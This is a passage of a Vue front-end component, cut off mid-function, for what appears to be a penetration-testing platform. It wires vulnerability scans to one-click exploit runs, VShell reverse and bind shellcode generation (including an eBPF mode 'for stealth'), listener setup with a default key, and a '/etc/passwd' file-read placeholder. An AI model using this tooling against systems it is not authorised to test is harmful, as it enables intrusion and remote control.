<template>
  <div class="target-workspace">
    <div class="workspace-header">
      <div class="header-left">
        <el-button size="small" @click="goBack">← Back</el-button>
        <h1>{{ currentTarget?.name || 'Target Details' }}</h1>
      </div>
      <div class="header-right">
        <el-tag v-if="currentTarget" type="info">{{ currentTarget.url }}</el-tag>
      </div>
    </div>

    <el-tabs v-model="activeTab" class="workspace-tabs">
      <el-tab-pane label="Scan" name="scan">
        <el-card shadow="hover" class="workspace-card">
          <template #header>
            <span>Run Scan</span>
          </template>
          <el-form label-width="140px" @submit.prevent="startScan">
            <el-form-item label="Target">
              <el-input :value="currentTarget?.url" disabled />
            </el-form-item>
            <el-form-item>
              <el-button type="primary" :loading="scanning" @click="startScan">Start Scan</el-button>
            </el-form-item>
          </el-form>
        </el-card>

        <el-card v-if="scanResult" shadow="hover" class="workspace-card">
          <template #header>
            <span>Scan Results</span>
          </template>
          <el-descriptions :column="2" border size="small">
            <el-descriptions-item label="Run ID">{{ scanResult.run_id }}</el-descriptions-item>
            <el-descriptions-item label="Status">
              <el-tag size="small" :type="scanResult.run?.summary.status === 'success' ? 'success' : 'danger'">
                {{ scanResult.run?.summary.status || 'running' }}
              </el-tag>
            </el-descriptions-item>
          </el-descriptions>
        </el-card>
      </el-tab-pane>

      <el-tab-pane label="Settings" name="settings">
        <el-card shadow="hover" class="workspace-card">
          <template #header>
            <span>Target Settings</span>
          </template>
          <el-form label-width="160px">
            <el-form-item label="Target Name">
              <el-input v-model="targetName" placeholder="Target name" />
            </el-form-item>
            <el-form-item label="Target URL">
              <el-input v-model="targetUrl" placeholder="https://target.com" />
            </el-form-item>
            <el-divider />
            <el-form-item label="VShell Integration">
              <el-switch v-model="vshellEnabled" @change="onVShellEnabledChange" />
              <div class="field-hint">Enable reverse shell integration for this target</div>
            </el-form-item>
            <el-form-item v-if="vshellEnabled" label="VShell Listener">
              <div style="display: flex; gap: 8px; align-items: flex-start; flex-direction: column; width: 100%;">
                <el-select v-model="vshellListenerId" placeholder="Select or create listener" style="width: 100%;" @focus="loadListeners">
                  <el-option
                    v-for="listener in listeners"
                    :key="listener.id"
                    :label="`${listener.name} (${listener.protocol}:${listener.port})`"
                    :value="listener.id"
                  />
                </el-select>
                <el-button size="small" @click="showAddListenerDialog = true">Add New Listener</el-button>
              </div>
              <div class="field-hint">Select a VShell listener for shellcode generation</div>
            </el-form-item>
            <el-form-item>
              <el-button type="primary" @click="saveTargetSettings" :loading="savingSettings">Save Settings</el-button>
            </el-form-item>
          </el-form>
        </el-card>
      </el-tab-pane>

      <el-tab-pane label="Assets" name="assets">
        <el-card shadow="hover" class="workspace-card">
          <template #header>
            <div class="card-header">
              <span>Asset Summary</span>
              <el-button size="small" @click="loadAssets" :loading="assetStore.loading">Refresh</el-button>
            </div>
          </template>
          <el-row :gutter="20" class="stat-cards">
            <el-col :span="6">
              <div class="stat-card">
                <div class="stat-number">{{ assetStore.summary.hosts }}</div>
                <div class="stat-label">Hosts</div>
              </div>
            </el-col>
            <el-col :span="6">
              <div class="stat-card">
                <div class="stat-number">{{ assetStore.summary.ports }}</div>
                <div class="stat-label">Ports</div>
              </div>
            </el-col>
            <el-col :span="6">
              <div class="stat-card">
                <div class="stat-number">{{ assetStore.summary.paths }}</div>
                <div class="stat-label">Paths</div>
              </div>
            </el-col>
            <el-col :span="6">
              <div class="stat-card">
                <div class="stat-number" :class="{ 'has-vulns': exploitableVulnerabilityCount > 0 }">
                  {{ exploitableVulnerabilityCount }}
                </div>
                <div class="stat-label">Vulnerabilities</div>
              </div>
            </el-col>
          </el-row>
        </el-card>

        <el-card v-if="assetStore.hosts.length > 0" shadow="hover" class="workspace-card">
          <template #header>
            <span>Discovered Hosts</span>
          </template>
          <el-collapse accordion>
            <el-collapse-item v-for="host in assetStore.hosts" :key="host.id" :name="host.id">
              <template #title>
                <div class="host-title">
                  <el-tag type="success" size="small">{{ host.ip }}</el-tag>
                  <span v-if="host.hostname" class="host-domain">{{ host.hostname }}</span>
                  <div class="host-badges">
                    <el-badge :value="host.ports?.length || 0" type="warning" />
                    <span class="badge-label">ports</span>
                    <el-badge v-if="countHostVulns(host) > 0" :value="countHostVulns(host)" type="danger" />
                    <span v-if="countHostVulns(host) > 0" class="badge-label">vulns</span>
                  </div>
                </div>
              </template>

              <el-table v-if="host.ports && host.ports.length > 0" :data="host.ports" size="small" stripe>
                <el-table-column prop="port" label="Port" width="80" />
                <el-table-column prop="service" label="Service" width="120" />
                <el-table-column prop="protocol" label="Protocol" width="100" />
                <el-table-column label="Paths" width="80">
                  <template #default="{ row }">
                    <el-tag v-if="row.paths && row.paths.length > 0" size="small" type="info">
                      {{ row.paths.length }}
                    </el-tag>
                    <span v-else>-</span>
                  </template>
                </el-table-column>
                <el-table-column label="Vulnerabilities" width="150">
                  <template #default="{ row }">
                    <div v-if="row.vulns && row.vulns.length > 0" class="vuln-tags">
                      <el-tag
                        v-for="vuln in row.vulns.slice(0, 2)"
                        :key="vuln.id"
                        size="small"
                        :type="vulnSeverityType(classifyVulnerability(vuln))"
                      >
                        {{ vuln.name }}
                      </el-tag>
                      <el-tag v-if="row.vulns.length > 2" size="small" type="info">
                        +{{ row.vulns.length - 2 }}
                      </el-tag>
                    </div>
                    <span v-else>-</span>
                  </template>
                </el-table-column>
                <el-table-column label="Actions" width="120" fixed="right">
                  <template #default="{ row }">
                    <el-button size="small" @click="viewPortDetails(host, row)">Details</el-button>
                  </template>
                </el-table-column>
              </el-table>
              <div v-else class="empty-hint">No ports discovered</div>
            </el-collapse-item>
          </el-collapse>
        </el-card>

        <el-card v-if="allVulnerabilities.length > 0" shadow="hover" class="workspace-card">
          <template #header>
            <div class="card-header">
              <span>Vulnerabilities</span>
              <el-tag type="danger">{{ exploitableVulnerabilityCount }} exploitable</el-tag>
            </div>
          </template>
          <el-table :data="allVulnerabilities" row-key="id" size="small" stripe>
            <el-table-column type="expand" width="56">
              <template #default="{ row }">
                <div class="vuln-group-expand">
                  <div class="vuln-group-expand-title">Matched URLs</div>
                  <div class="vuln-hit-list">
                    <div v-for="hit in row.hits" :key="hit.id" class="vuln-hit-item">
                      <el-tag size="small" :type="vulnSeverityType(hit.severity)">
                        {{ hitLabel(hit) }}
                      </el-tag>
                      <span class="vuln-hit-target">{{ hit.target }}</span>
                    </div>
                  </div>
                </div>
              </template>
            </el-table-column>
            <el-table-column label="Severity" width="100">
              <template #default="{ row }">
                <el-tag size="small" :type="vulnSeverityType(row.severity)">
                  {{ severityLabel(row.severity) }}
                </el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="name" label="Name" min-width="260" show-overflow-tooltip />
            <el-table-column prop="target" label="Target" min-width="280" show-overflow-tooltip />
            <el-table-column label="Paths" width="80">
              <template #default="{ row }">
                <el-tag size="small" type="info">{{ row.hits.length }}</el-tag>
              </template>
            </el-table-column>
            <el-table-column label="Exploitable" width="100">
              <template #default="{ row }">
                <el-tag v-if="row.exp_available" size="small" type="danger">Yes</el-tag>
                <span v-else>-</span>
              </template>
            </el-table-column>
            <el-table-column label="Actions" width="120" fixed="right">
              <template #default="{ row }">
                <el-button v-if="row.exp_available" size="small" type="danger" @click="openVulnExploit(row)">
                  Exploit
                </el-button>
              </template>
            </el-table-column>
          </el-table>
        </el-card>

        <div v-if="!assetStore.loading && assetStore.hosts.length === 0" class="empty-hint">
          No assets discovered yet. Run a scan to discover assets.
        </div>

        <el-card v-if="scanResult" shadow="hover" class="workspace-card">
          <template #header>
            <div class="section-header">
              <span>输出文件</span>
              <el-button size="small" @click="loadOutputFiles" :loading="loadingFiles">刷新</el-button>
            </div>
          </template>
          <el-table v-if="outputFiles.length" :data="outputFiles" size="small" stripe>
            <el-table-column prop="name" label="文件名" min-width="200">
              <template #default="{ row }">
                <el-link type="primary" @click="viewFile(row)">{{ row.name }}</el-link>
              </template>
            </el-table-column>
            <el-table-column prop="type" label="类型" width="100" />
            <el-table-column label="大小" width="120">
              <template #default="{ row }">
                {{ formatFileSize(row.size_bytes) }}
              </template>
            </el-table-column>
          </el-table>
          <div v-else-if="!loadingFiles" class="empty-hint">暂无输出文件</div>

          <div v-if="selectedFileName" style="margin-top: 16px;">
            <el-divider />
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
              <span style="font-weight: 500;">{{ selectedFileName }}</span>
              <el-button size="small" @click="clearFileView">关闭</el-button>
            </div>
            <div v-if="fileEntries" class="jsonl-viewer">
              <el-collapse accordion>
                <el-collapse-item v-for="(entry, idx) in fileEntries" :key="idx" :name="idx">
                  <template #title>
                    <span>{{ entry['template-id'] || `Entry ${idx + 1}` }}</span>
                  </template>
                  <el-input
                    type="textarea"
                    :model-value="JSON.stringify(entry, null, 2)"
                    :autosize="{ minRows: 4, maxRows: 20 }"
                    readonly
                  />
                </el-collapse-item>
              </el-collapse>
            </div>
            <el-input
              v-else
              type="textarea"
              :model-value="fileContent"
              :autosize="{ minRows: 6, maxRows: 30 }"
              readonly
            />
          </div>
        </el-card>
      </el-tab-pane>

      <el-tab-pane label="Exploit" name="exploit">
        <el-card shadow="hover" class="workspace-card">
          <template #header>
            <span>Available Exploits</span>
          </template>
          <el-table v-if="exploits.length" :data="exploits" size="small" stripe>
            <el-table-column prop="name" label="Name" width="200" />
            <el-table-column prop="cve" label="CVE" width="150" />
            <el-table-column prop="severity" label="Severity" width="100">
              <template #default="{ row }">
                <el-tag size="small" :type="severityTag(row.severity)">{{ row.severity }}</el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="description" label="Description" show-overflow-tooltip />
            <el-table-column label="Actions" width="200" fixed="right">
              <template #default="{ row }">
                <el-button size="small" @click="checkExploit(row)">Check</el-button>
                <el-button size="small" type="danger" @click="runExploit(row)">Exploit</el-button>
              </template>
            </el-table-column>
          </el-table>
          <div v-else class="empty-hint">No exploits available</div>
        </el-card>
      </el-tab-pane>
    </el-tabs>

    <el-dialog v-model="showDialog" :title="dialogTitle" width="620px">
      <el-form label-width="110px">
        <el-form-item label="Module">
          <el-input :model-value="selectedExploit?.id" disabled />
        </el-form-item>
        <el-form-item label="Target">
          <el-input v-model="exploitTarget" placeholder="https://target:3000" />
        </el-form-item>
        <el-form-item v-if="showCommandInput" label="Command">
          <el-input v-model="exploitCommand" :placeholder="selectedExploit?.default_command || 'id'" />
        </el-form-item>
        <el-form-item
          v-for="option in selectedExploitOptions"
          :key="option.key"
          :label="option.label"
        >
          <el-input
            v-model="exploitOptionValues[option.key]"
            :type="option.type === 'textarea' ? 'textarea' : 'text'"
            :placeholder="option.placeholder || ''"
          />
          <div v-if="option.description" class="option-hint">{{ option.description }}</div>
        </el-form-item>
        <el-divider v-if="vshellEnabled && vshellListenerId" />
        <el-form-item v-if="vshellEnabled && vshellListenerId" label="Use VShell">
          <el-switch v-model="useVShellShellcode" />
          <div class="field-hint">Generate and upload shellcode from VShell</div>
        </el-form-item>
        <el-form-item v-if="useVShellShellcode" label="Connection Mode">
          <el-radio-group v-model="vshellConnectionMode">
            <el-radio value="reverse">Reverse Shell (Target connects to you)</el-radio>
            <el-radio value="listen">Listen Mode (You connect to target)</el-radio>
          </el-radio-group>
          <div class="field-hint">
            {{ vshellConnectionMode === 'reverse'
              ? 'Target will connect back to your listener'
              : 'Target will open a port for you to connect to' }}
          </div>
        </el-form-item>
        <el-form-item v-if="useVShellShellcode && vshellConnectionMode === 'reverse'" label="Client Type">
          <el-select v-model="shellcodeClientType" style="width: 100%;">
            <el-option label="Shellcode" value="shellcode" />
            <el-option label="Stage" value="stage" />
            <el-option label="Stageless" value="stageless" />
            <el-option label="DLL" value="dll" />
          </el-select>
        </el-form-item>
        <el-form-item v-if="useVShellShellcode && vshellConnectionMode === 'listen'" label="Listen Type">
          <el-select v-model="listenModeType" style="width: 100%;">
            <el-option label="Standard Listen" value="listen">
              <span>Standard Listen</span>
              <span style="color: #909399; font-size: 12px; margin-left: 8px;">TCP/HTTP/WS bind shell</span>
            </el-option>
            <el-option label="DLL Listen" value="dll_listen">
              <span>DLL Listen</span>
              <span style="color: #909399; font-size: 12px; margin-left: 8px;">DLL-based bind shell</span>
            </el-option>
            <el-option label="eBPF Listen" value="ebpf_listen">
              <span>eBPF Listen</span>
              <span style="color: #909399; font-size: 12px; margin-left: 8px;">Linux eBPF bind shell</span>
            </el-option>
          </el-select>
          <div class="field-hint">
            {{ listenModeType === 'listen' ? 'Standard bind shell payload' :
               listenModeType === 'dll_listen' ? 'DLL format for Windows injection' :
               'Linux eBPF mode for stealth' }}
          </div>
        </el-form-item>
        <el-form-item v-if="useVShellShellcode && vshellConnectionMode === 'listen'" label="Target Port">
          <el-input-number v-model="listenModeTargetPort" :min="1" :max="65535" style="width: 100%;" />
          <div class="field-hint">Port that will be opened on the target machine</div>
        </el-form-item>
        <el-form-item v-if="useVShellShellcode && vshellConnectionMode === 'listen'" label="Protocol">
          <el-select v-model="listenModeProtocol" style="width: 100%;">
            <el-option label="TCP" value="tcp" />
            <el-option label="HTTP" value="http" />
            <el-option label="HTTPS" value="https" />
            <el-option label="WebSocket" value="ws" />
            <el-option label="KCP" value="kcp" />
          </el-select>
          <div class="field-hint">Transport protocol for the bind shell</div>
        </el-form-item>
        <el-form-item v-if="useVShellShellcode && vshellConnectionMode === 'listen'" label="Connection Key">
          <el-input v-model="listenModeVKey" placeholder="qwe123qwe" />
          <div class="field-hint">Encryption key (default: qwe123qwe)</div>
        </el-form-item>
        <el-form-item v-if="useVShellShellcode && vshellConnectionMode === 'listen'" label="Encryption Salt">
          <el-input v-model="listenModeSalt" placeholder="qwe123qwe" />
          <div class="field-hint">Encryption salt (default: qwe123qwe)</div>
        </el-form-item>
        <el-form-item v-if="useVShellShellcode" label="Architecture">
          <el-select v-model="shellcodeArch" style="width: 100%;">
            <el-option label="Windows x64" value="windows_amd64.bin" />
            <el-option label="Windows x86" value="windows_386.bin" />
            <el-option label="Linux x64" value="linux_amd64.bin" />
            <el-option label="Linux x86" value="linux_386.bin" />
            <el-option label="Linux ARM" value="linux_arm.bin" />
            <el-option label="macOS x64" value="darwin_amd64.bin" />
            <el-option label="macOS ARM64" value="darwin_arm64.bin" />
          </el-select>
        </el-form-item>
        <el-alert
          v-if="showExecuteInfoAlert"
          title="This exploit does not expose command echo. Only execution status will be shown."
          type="info"
          :closable="false"
          show-icon
        />
      </el-form>
      <template #footer>
        <el-button @click="showDialog = false">Cancel</el-button>
        <el-button type="danger" @click="submitExploit" :loading="executing">
          Exploit
        </el-button>
      </template>
    </el-dialog>

    <el-card v-if="exploitResult" shadow="hover" class="result-card">
      <template #header>
        <div class="card-header">
          <span>Exploit Result</span>
          <el-tag size="small" :type="resultTagType(resultStatus)">{{ resultStatus || 'unknown' }}</el-tag>
        </div>
      </template>

      <el-descriptions :column="2" border size="small">
        <el-descriptions-item label="Mode">{{ exploitResultMode }}</el-descriptions-item>
        <el-descriptions-item label="Accepted">{{ formatValue(exploitResult?.accepted) }}</el-descriptions-item>
        <el-descriptions-item label="Status">{{ formatValue(exploitResult?.status) }}</el-descriptions-item>
        <el-descriptions-item label="Request ID">{{ formatValue(exploitResult?.request_id) }}</el-descriptions-item>
      </el-descriptions>

      <div v-if="checkSummary" class="result-section">
        <div class="result-section-title">Check Summary</div>
        <el-descriptions :column="3" border size="small">
          <el-descriptions-item label="Vulnerable">{{ formatValue(checkSummary.vulnerable) }}</el-descriptions-item>
          <el-descriptions-item label="Confidence">{{ formatConfidence(checkSummary.confidence) }}</el-descriptions-item>
          <el-descriptions-item label="Detail">{{ formatValue(checkSummary.detail) }}</el-descriptions-item>
        </el-descriptions>
      </div>

      <div v-if="echoPayload" class="result-section">
        <div class="result-section-title">Request Echo</div>
        <el-descriptions :column="2" border size="small">
          <el-descriptions-item label="Target">{{ formatValue(echoPayload.target) }}</el-descriptions-item>
          <el-descriptions-item label="Exploit">{{ formatValue(echoPayload.exploit_id || echoPayload.executor) }}</el-descriptions-item>
          <el-descriptions-item label="Mode">{{ formatValue(echoPayload.mode || echoPayload.command_mode || exploitResultMode) }}</el-descriptions-item>
          <el-descriptions-item label="Command">{{ formatValue(echoPayload.command) }}</el-descriptions-item>
          <el-descriptions-item
            v-for="item in echoOptionItems"
            :key="item.key"
            :label="item.label"
          >
            {{ formatValue(item.value) }}
          </el-descriptions-item>
        </el-descriptions>
      </div>

      <div v-if="executionOutput" class="result-section">
        <div class="result-section-title">Execution Output</div>
        <pre class="result-output">{{ executionOutput }}</pre>
      </div>

      <div v-else-if="executionDetail" class="result-section">
        <div class="result-section-title">Execution Detail</div>
        <pre class="result-output">{{ executionDetail }}</pre>
      </div>

      <div v-if="rawEvidence" class="result-section">
        <div class="result-section-title">Evidence / Artifacts</div>
        <pre class="result-output">{{ JSON.stringify(rawEvidence, null, 2) }}</pre>
      </div>

      <div class="result-section">
        <div class="result-section-title">Raw JSON</div>
        <pre class="result-output">{{ JSON.stringify(exploitResult, null, 2) }}</pre>
      </div>
    </el-card>
  </div>

  <!-- Add Listener Dialog -->
  <el-dialog v-model="showAddListenerDialog" title="Add New Listener" width="500px">
    <el-form label-width="120px">
      <el-form-item label="Listener Name" required>
        <el-input v-model="newListenerName" placeholder="e.g., main-listener" />
      </el-form-item>
      <el-form-item label="Local Address" required>
        <el-input v-model="newListenerHost" placeholder="0.0.0.0" />
      </el-form-item>
      <el-form-item label="Connect Address">
        <el-input v-model="newListenerConnectHost" placeholder="127.0.0.1" />
      </el-form-item>
      <el-form-item label="Port" required>
        <el-input-number v-model="newListenerPort" :min="1" :max="65535" style="width: 100%;" />
      </el-form-item>
      <el-form-item label="Protocol">
        <el-select v-model="newListenerProtocol" style="width: 100%;">
          <el-option label="TCP" value="tcp" />
          <el-option label="HTTP" value="http" />
          <el-option label="HTTPS" value="https" />
          <el-option label="WebSocket" value="ws" />
          <el-option label="KCP" value="kcp" />
        </el-select>
      </el-form-item>
    </el-form>
    <template #footer>
      <el-button @click="showAddListenerDialog = false">Cancel</el-button>
      <el-button type="primary" :loading="addingListener" @click="addNewListener">Add Listener</el-button>
    </template>
  </el-dialog>
</template>

<script setup lang="ts">
import { computed, onMounted, ref } from 'vue'
import { useRoute, useRouter } from 'vue-router'
import { ElMessage, ElMessageBox } from 'element-plus'
import { getProjectTargets, updateTarget, type Target } from '@/api/target'
import { fetchLatestTargetRun, startScan as startScanAPI, fetchOutputFiles, fetchOutputFileContent } from '@/api/scan'
import { listExploits, triggerExploit, type ExploitInfo } from '@/api/exploit'
import { useAssetStore } from '@/stores/asset'
import type { ExploitOption } from '@/types'
import { listListeners, addListener, generateShellcode, downloadListenPayload, type VShellListener } from '@/api/vshell'

const route = useRoute()
const router = useRouter()
const assetStore = useAssetStore()

type ExploitMode = 'check' | 'execute'
type VulnerabilityLevel = 'severity' | 'warning' | 'info'

type VulnerabilityHit = {
  id: string
  name: string
  severity: VulnerabilityLevel
  exp_available: boolean
  target: string
  site: string
  host: string
  port: number
  path: string
  cve?: string
  detail?: string
}

type VulnerabilityGroup = {
  id: string
  name: string
  severity: VulnerabilityLevel
  exp_available: boolean
  target: string
  exploit_target: string
  hits: VulnerabilityHit[]
}

const projectId = computed(() => route.params.id as string)
const targetId = computed(() => route.params.tid as string)
const currentTarget = ref<Target | null>(null)
const activeTab = ref('scan')
const scanning = ref(false)
const scanResult = ref<any>(null)
const exploits = ref<ExploitInfo[]>([])

const outputFiles = ref<any[]>([])
const loadingFiles = ref(false)
const selectedFileName = ref('')
const fileContent = ref('')
const fileEntries = ref<any[] | null>(null)

const targetName = ref('')
const targetUrl = ref('')
const vshellEnabled = ref(false)
const vshellListenerId = ref('')
const vshellHost = ref('')
const vshellPort = ref<number | undefined>(undefined)
const savingSettings = ref(false)

const listeners = ref<VShellListener[]>([])
const showAddListenerDialog = ref(false)
const newListenerName = ref('')
const newListenerHost = ref('0.0.0.0')
const newListenerConnectHost = ref('127.0.0.1')
const newListenerPort = ref(8088)
const newListenerProtocol = ref('tcp')
const addingListener = ref(false)

const showDialog = ref(false)
const selectedExploit = ref<ExploitInfo | null>(null)
const selectedMode = ref<ExploitMode>('execute')
const exploitTarget = ref('')
const exploitCommand = ref('')
const exploitOptionValues = ref<Record<string, string>>({})
const executing = ref(false)
const exploitResult = ref<any>(null)
const exploitResultMode = ref<ExploitMode>('execute')

const useVShellShellcode = ref(false)
const vshellConnectionMode = ref<'reverse' | 'listen'>('reverse')
const shellcodeClientType = ref('shellcode')
const shellcodeArch = ref('windows_amd64.bin')
const listenModeType = ref('listen')
const listenModeTargetPort = ref(8080)
const listenModeProtocol = ref('tcp')
const listenModeVKey = ref('qwe123qwe')
const listenModeSalt = ref('qwe123qwe')

const showCommandInput = computed(() => selectedMode.value === 'execute' && !!selectedExploit.value?.supports_command)
const selectedExploitOptions = computed(() => {
  if (!selectedExploit.value) return []
  return filterExploitOptions(selectedExploit.value, selectedMode.value)
})
const showExecuteInfoAlert = computed(() => selectedMode.value === 'execute' && !showCommandInput.value && selectedExploitOptions.value.length === 0)
const dialogTitle = computed(() => selectedMode.value === 'check' ? 'Check Exploit' : 'Execute Exploit')
const resultStatus = computed(() => exploitResult.value?.status || exploitResult.value?.result?.status || '')
const checkSummary = computed(() => exploitResult.value?.result || null)
const executionOutput = computed(() => exploitResult.value?.result?.output || exploitResult.value?.output || '')
const executionDetail = computed(() => exploitResult.value?.result?.detail || exploitResult.value?.message || '')
const rawEvidence = computed(() => exploitResult.value?.result?.evidence || exploitResult.value?.result?.artifacts || null)
const echoPayload = computed(() => {
  const echo = exploitResult.value?.echo
  if (echo && typeof echo === 'object') return echo

  const artifacts = exploitResult.value?.result?.artifacts
  if (artifacts && typeof artifacts === 'object') {
    return {
      target: exploitTarget.value.trim(),
      exploit_id: selectedExploit.value?.id,
      mode: exploitResultMode.value,
      command: artifacts.command || exploitCommand.value,
      options: buildPayloadOptions(),
    }
  }

  if (exploitResult.value) {
    return {
      target: exploitTarget.value.trim(),
      exploit_id: selectedExploit.value?.id,
      mode: exploitResultMode.value,
      command: showCommandInput.value ? exploitCommand.value : '',
      options: buildPayloadOptions(),
    }
  }

  return null
})
const echoOptionItems = computed(() => {
  const options = echoPayload.value?.options
  if (!options || typeof options !== 'object') return []
  const dict = options as Record<string, unknown>
  const known = new Set<string>()
  const items = selectedExploitOptions.value
    .filter(option => option.key in dict)
    .map(option => {
      known.add(option.key)
      return { key: option.key, label: option.label, value: dict[option.key] }
    })

  if ('leak_path' in dict && !known.has('leak_path')) {
    items.push({ key: 'leak_path', label: 'Leak Path', value: dict.leak_path })
    known.add('leak_path')
  }

  Object.keys(dict).forEach(key => {
    if (!known.has(key)) {
      items.push({ key, label: key, value: dict[key] })
    }
  })

  return items
})

function normalizeVulnPath(path?: string): string {
  return path && path.trim() ? path : '/'
}

function currentTargetOrigin(): string {
  const raw = currentTarget.value?.url || ''
  if (!raw) return ''
  try {
    return new URL(raw).origin
  } catch {
    return raw.replace(/\/+$/, '')
  }
}

function buildVulnTarget(site: string, path: string): string {
  if (site.startsWith('http://') || site.startsWith('https://')) {
    return `${site}${path === '/' ? '' : path}`
  }
  return `${site}${path}`
}

function classifyVulnerability(vuln: {
  severity?: string
  exp_available?: boolean
  name?: string
  cve?: string
  detail?: string
}): VulnerabilityLevel {
  if (vuln.exp_available) return 'severity'

  const text = `${vuln.name || ''} ${vuln.cve || ''} ${vuln.detail || ''}`.toLowerCase()
  if (/(disclosure|exposure|exposed|leak|leakage|sensitive|secret|credential|token|dump|directory listing|file read|source code|config|env\b)/.test(text)) {
    return 'warning'
  }
  if (/(fingerprint|framework|technology|tech stack|surface detection|http fingerprint|react|next\.js|vue|angular|nuxt|laravel|spring|django|flask|wordpress|apache|nginx)/.test(text)) {
    return 'info'
  }

  const severity = (vuln.severity || '').toLowerCase()
  if (severity === 'critical' || severity === 'high') return 'severity'
  if (severity === 'medium') return 'warning'
  return 'info'
}

function severityRank(level: VulnerabilityLevel): number {
  if (level === 'severity') return 3
  if (level === 'warning') return 2
  return 1
}

function highestSeverity(levels: VulnerabilityLevel[]): VulnerabilityLevel {
  return levels.reduce<VulnerabilityLevel>((highest, current) => {
    return severityRank(current) > severityRank(highest) ? current : highest
  }, 'info')
}

const rawVulnerabilityHits = computed<VulnerabilityHit[]>(() => {
  const vulns: VulnerabilityHit[] = []
  const site = currentTargetOrigin()

  assetStore.hosts.forEach((host: any) => {
    host.ports?.forEach((port: any) => {
      const fallbackSite = `${host.ip}:${port.port}`
      const vulnSite = site || fallbackSite
      const pathsById = new Map<string, string>()

      port.paths?.forEach((pathItem: any) => {
        pathsById.set(pathItem.id, normalizeVulnPath(pathItem.path))
      })

      port.vulns?.forEach((vuln: any) => {
        const path = normalizeVulnPath(pathsById.get(vuln.path_id))
        vulns.push({
          id: vuln.id,
          name: vuln.name,
          severity: classifyVulnerability(vuln),
          exp_available: vuln.exp_available,
          target: buildVulnTarget(vulnSite, path),
          site: vulnSite,
          host: host.ip,
          port: port.port,
          path,
          cve: vuln.cve,
          detail: vuln.detail,
        })
      })

      port.paths?.forEach((pathItem: any) => {
        pathItem.vulns?.forEach((vuln: any) => {
          const path = normalizeVulnPath(pathItem.path)
          vulns.push({
            id: vuln.id,
            name: vuln.name,
            severity: classifyVulnerability(vuln),
            exp_available: vuln.exp_available,
            target: buildVulnTarget(vulnSite, path),
            site: vulnSite,
            host: host.ip,
            port: port.port,
            path,
            cve: vuln.cve,
            detail: vuln.detail,
          })
        })
      })
    })
  })

  return vulns
})

const allVulnerabilities = computed<VulnerabilityGroup[]>(() => {
  const groups = new Map<string, VulnerabilityGroup>()

  rawVulnerabilityHits.value.forEach((hit) => {
    const key = `${hit.site}::${hit.name}`
    const hitKey = `${hit.target}::${hit.path}`
    const existing = groups.get(key)
    if (existing) {
      if (!existing.hits.some((item) => `${item.target}::${item.path}` === hitKey)) {
        existing.hits.push(hit)
      }
      existing.exp_available = existing.exp_available || hit.exp_available
      return
    }

    groups.set(key, {
      id: key,
      name: hit.name,
      severity: hit.severity,
      exp_available: hit.exp_available,
      target: hit.target,
      exploit_target: hit.target,
      hits: [hit],
    })
  })

  return Array.from(groups.values())
    .map((group) => {
      const sortedHits = [...group.hits].sort((a, b) => a.path.localeCompare(b.path) || a.target.localeCompare(b.target))
      const first = sortedHits[0]
      const firstPath = first?.path || '/'
      const summaryTarget = sortedHits.length === 1
        ? first.target
        : `${first.site}${firstPath === '/' ? '' : firstPath} (+${sortedHits.length - 1} paths)`

      return {
        ...group,
        severity: highestSeverity(sortedHits.map((hit) => hit.severity)),
        target: summaryTarget,
        exploit_target: first.target,
        hits: sortedHits,
      }
    })
    .sort((a, b) => b.hits.length - a.hits.length || a.name.localeCompare(b.name))
})

const vulnerabilityHitCount = computed(() => {
  return allVulnerabilities.value.reduce((count, group) => count + group.hits.length, 0)
})

const exploitableVulnerabilityCount = computed(() => {
  return allVulnerabilities.value
    .filter((group) => group.exp_available)
    .reduce((count, group) => count + group.hits.length, 0)
})

function countHostVulns(host: any): number {
  let count = 0
  host.ports?.forEach((port: any) => {
    count += port.vulns?.length || 0
    port.paths?.forEach((path: any) => {
      count += path.vulns?.length || 0
    })
  })
  return count
}

function severityLabel(severity: string): string {
  const s = (severity || '').toLowerCase()
  if (s === 'severity') return 'Severity'
  if (s === 'warning') return 'Warning'
  return 'Info'
}

function vulnSeverityType(severity: string): string {
  const s = (severity || '').toLowerCase()
  if (s === 'severity' || s === 'critical' || s === 'high') return 'danger'
  if (s === 'warning' || s === 'medium') return 'warning'
  return 'info'
}

function viewPortDetails(host: any, port: any) {
  ElMessage.info(`Port ${port.port} on ${host.ip}`)
}

function normalizeText(value?: string): string {
  return String(value || '').trim().toLowerCase()
}

function inferExploitKind(vuln: VulnerabilityGroup): 'execute' | 'leak' {
  const text = `${vuln.name} ${vuln.hits.map(hit => `${hit.cve || ''} ${hit.detail || ''}`).join(' ')}`.toLowerCase()
  if (/(disclosure|exposure|exposed|leak|leakage|sensitive|secret|credential|token|dump|directory listing|file read|source code|config|env\b)/.test(text)) {
    return 'leak'
  }
  return 'execute'
}

function findExploitForVulnerability(vuln: VulnerabilityGroup): ExploitInfo | null {
  const cves = new Set(vuln.hits.map(hit => normalizeText(hit.cve)).filter(Boolean))
  const vulnName = normalizeText(vuln.name)

  return exploits.value.find((exploit) => {
    const exploitCve = normalizeText(exploit.cve)
    const exploitName = normalizeText(exploit.name)
    if (exploitCve && cves.has(exploitCve)) {
      return true
    }
    if (!vulnName || !exploitName) {
      return false
    }
    return exploitName.includes(vulnName) || vulnName.includes(exploitName)
  }) || null
}

function buildFallbackExploit(vuln: VulnerabilityGroup): ExploitInfo {
  const exploitKind = inferExploitKind(vuln)
  const firstCve = vuln.hits.find(hit => hit.cve)?.cve || ''

  return {
    id: 'auto',
    name: vuln.name,
    description: vuln.hits[0]?.detail || vuln.name,
    cve: firstCve,
    severity: vuln.severity,
    targets: [],
    supports_check: true,
    supports_exploit: true,
    supports_execute: true,
    supports_command: exploitKind === 'execute',
    exploit_kind: exploitKind,
    options: exploitKind === 'leak'
      ? [{
          key: 'leak_path',
          label: 'Leak Path',
          placeholder: '/etc/passwd',
          description: 'Path to read from the target.',
          required: true,
          modes: ['execute'],
        }]
      : [],
    default_command: 'id',
  }
}

function resolveExploitForVulnerability(vuln: VulnerabilityGroup): ExploitInfo {
  return findExploitForVulnerability(vuln) || buildFallbackExploit(vuln)
}

function openExploitDialog(exploit: ExploitInfo, target: string) {
  const resolvedTarget = target.trim()
  if (!resolvedTarget) {
    ElMessage.warning('Please enter a target')
    return
  }

  selectedExploit.value = exploit
  selectedMode.value = 'execute'
  exploitTarget.value = resolvedTarget
  exploitCommand.value = exploit.default_command || 'id'
  exploitOptionValues.value = {}

  for (const option of filterExploitOptions(exploit, 'execute')) {
